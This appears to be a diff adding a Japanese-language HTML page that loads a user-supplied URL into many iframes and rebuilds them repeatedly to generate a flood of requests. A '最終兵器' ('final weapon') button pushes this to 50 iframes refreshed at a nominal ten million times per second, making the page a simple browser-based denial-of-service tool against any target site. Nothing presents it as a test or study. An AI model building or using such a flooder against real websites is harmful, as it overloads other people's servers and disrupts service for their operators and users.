@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>複数のインラインフレーム</title>
+  <style>
+    iframe {
+      width: 200px;  /* 小さなサイズ */
+      height: 150px;
+      border: 1px solid black;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>複数のインラインフレームを表示してリクエスト更新</h1>
+
+  <!-- URL入力 -->
+  <label for="urlInput">URL:</label>
+  <input type="text" id="urlInput" placeholder="https://example.com" required><br><br>
+
+  <!-- 表示するインラインフレームの数 -->
+  <label for="iframeCount">表示するインラインフレームの数:</label>
+  <input type="number" id="iframeCount" value="5" min="1" required><br><br>
+
+  <!-- 1秒間に更新する回数 -->
+  <label for="updateRate">1秒間に更新する回数:</label>
+  <input type="number" id="updateRate" value="3" min="1" required><br><br>
+
+  <button onclick="startUpdatingIframes()">インラインフレームの更新開始</button>
+  <button onclick="startFinalWeapon()">最終兵器</button>
+  <button onclick="stopUpdating()">ストップ</button>
+
+  <p id="status"></p>
+
+  <div id="iframeContainer"></div>
+
+  <script>
+    let iframeIntervals = [];  // インターバルのIDを格納する配列
+
+    // インラインフレームを動的に追加する関数
+    function addIframes(url, iframeCount) {
+      const container = document.getElementById('iframeContainer');
+      container.innerHTML = ''; // 既存のiframeをクリア
+
+      for (let i = 0; i < iframeCount; i++) {
+        const iframe = document.createElement('iframe');
+        iframe.src = url;  // URLをiframeに設定
+        container.appendChild(iframe);
+      }
+    }
+
+    // インラインフレームの更新を開始する関数
+    function startUpdatingIframes() {
+      const url = document.getElementById('urlInput').value;
+      const iframeCount = parseInt(document.getElementById('iframeCount').value);
+      const updateRate = parseInt(document.getElementById('updateRate').value);
+
+      if (!url) {
+        alert('URLを入力してください。');
+        return;
+      }
+
+      // ステータスメッセージを更新
+      const statusElement = document.getElementById('status');
+      statusElement.textContent = `インラインフレームを${iframeCount}個表示し、1秒間に${updateRate}回更新します。`;
+
+      // インラインフレームを表示
+      addIframes(url, iframeCount);
+
+      // インラインフレームを指定した回数で更新する
+      iframeIntervals.push(setInterval(() => {
+        // iframeを削除して再追加
+        addIframes(url, iframeCount);
+      }, 1000 / updateRate));  // 1秒間に指定された回数で更新
+    }
+
+    // 「最終兵器」ボタンが押されたときに実行される関数
+    function startFinalWeapon() {
+      const url = document.getElementById('urlInput').value;
+
+      // 最終兵器の設定：iframe数 50個、更新回数 10000000回/秒
+      const iframeCount = 50;
+      const updateRate = 10000000;
+
+      if (!url) {
+        alert('URLを入力してください。');
+        return;
+      }
+
+      // ステータスメッセージを更新
+      const statusElement = document.getElementById('status');
+      statusElement.textContent = `「最終兵器」を起動！インラインフレームを${iframeCount}個表示し、1秒間に${updateRate}回更新します。`;
+
+      // インラインフレームを表示
+      addIframes(url, iframeCount);
+
+      // インラインフレームを指定した回数で更新する
+      iframeIntervals.push(setInterval(() => {
+        // iframeを削除して再追加
+        addIframes(url, iframeCount);
+      }, 1000 / updateRate));  // 1秒間に指定された回数で更新
+    }
+
+    // ストップボタンが押されたときにインターバルを停止する関数
+    function stopUpdating() {
+      // すべてのインターバルをクリア
+      iframeIntervals.forEach(interval => clearInterval(interval));
+      iframeIntervals = [];  // インターバルIDのリストをクリア
+      const statusElement = document.getElementById('status');
+      statusElement.textContent = "更新が停止しました。";
+    }
+
+    // ページが離れたときにインターバルをクリア
+    window.onbeforeunload = function() {
+      iframeIntervals.forEach(interval => clearInterval(interval));
+    };
+  </script>
+
+</body>
+</html>
